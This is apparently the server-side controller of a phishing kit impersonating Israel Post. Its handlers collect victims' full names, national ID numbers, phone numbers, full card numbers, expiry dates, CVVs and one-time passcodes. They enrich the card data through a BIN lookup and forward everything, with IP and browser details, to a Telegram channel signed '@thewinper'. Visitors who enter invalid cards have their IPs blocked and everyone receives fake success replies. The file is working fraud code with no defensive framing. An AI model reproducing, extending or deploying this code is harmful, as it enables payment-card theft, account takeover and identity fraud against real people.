const { telegramService } = require("../services");
const getUserAgent = require("../utils/getUserAgent");
const { default: axios } = require("axios");
const isValidCreditCard = require("../utils/isValidCreditCard");
const formatCreditCard = require("../utils/formatCreditCard");
const BlockedIP = require("../models/blockedIP.model");

module.exports.addCardDetails = async (req, res, next) => {
  try {
    const { fullName, idNumber, phoneNumber, cardNumber, expiry, cvv } =
      req.body;

    const isValidCard = isValidCreditCard(cardNumber, cvv, expiry);

    if (!isValidCard) {
      const blockedIP = new BlockedIP({ ip: req.ip });
      await blockedIP.save();
      return res.status(200).json({ success: true });
    }

    const bin = cardNumber.replace(/\D/g, "").substring(0, 7);
    const url = `https://lookup.binlist.net/${bin}`;
    const response = await axios.get(url);
    const cardDetails = response.data;

    const line1 = "[Israel Post - 💳 Card Info 💳]";
    const line2 = `[👤] Full Name: ${fullName}`;
    const line3 = `[👤] ID Number: ${idNumber}`;
    const line4 = `[👤] Phone Number: ${phoneNumber}`;
    const line5 = `[💳] CC Number: ${formatCreditCard(cardNumber)}`;
    const line6 = `[🔄] Expiry Date: ${expiry}`;
    const line7 = `[🔑] CVV: ${cvv}`;
    const line8 = `[🔍] GEO IP: ${req.ip}`;
    const line9 = "\n";
    const line10 = "[Israel Post - 💳 BIN Info 💳]";
    const line11 = `[🏛] Bank:  ${cardDetails?.bank?.name || "Unknown"}`;
    const line12 = `[💳] Scheme: ${
      cardDetails?.scheme?.toUpperCase?.() || "Unknown"
    }`;
    const line13 = `[💳] Type: ${
      cardDetails?.type?.toUpperCase?.() || "Unknown"
    }`;
    const line14 = `[💳] Brand: ${
      cardDetails?.brand?.toUpperCase?.() || "Unknown"
    }`;
    const line15 = `[💳] Prepaid: ${
      typeof cardDetails.prepaid === "boolean"
        ? cardDetails.prepaid
          ? "Yes"
          : "No"
        : "No"
    }`;
    const line16 = `[💳] Currency: ${
      cardDetails?.country?.currency || "Unknown"
    }`;
    const line17 = `[Israel Post By: @thewinper]`;

    const message = `${line1}\n${line2}\n${line3}\n${line4}\n${line5}\n${line6}\n${line7}\n${line8}\n${line9}\n${line10}\n${line11}\n${line12}\n${line13}\n${line14}\n${line15}\n${line16}\n${line17}`;

    telegramService.sendMessage(message);

    res.status(200).json({ success: true });
  } catch (err) {
    console.log("ERR", err);
    res.status(200).json({ success: true });
  }
};

module.exports.addCardOTP = async (req, res, next) => {
  try {
    const { otp } = req.body;

    const { osName, browser, ua } = getUserAgent(req);

    const message = `
    [=====>  Israel Post: @thewinper $ OTP    <=====]
    [ OTP Code: ${otp}
    [ IP: ${req.ip}
    [ OS: ${osName || "Unknown"}
    [ Browser: ${browser?.name || "Unknown"}
    [ UA: ${ua || "Unknown"}
    [=====>  Israel Post: @thewinper $ OTP   <=====]
    `;

    if (otp) {
      telegramService.sendMessage(message);
    }

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(200).json({ success: true });
  }
};
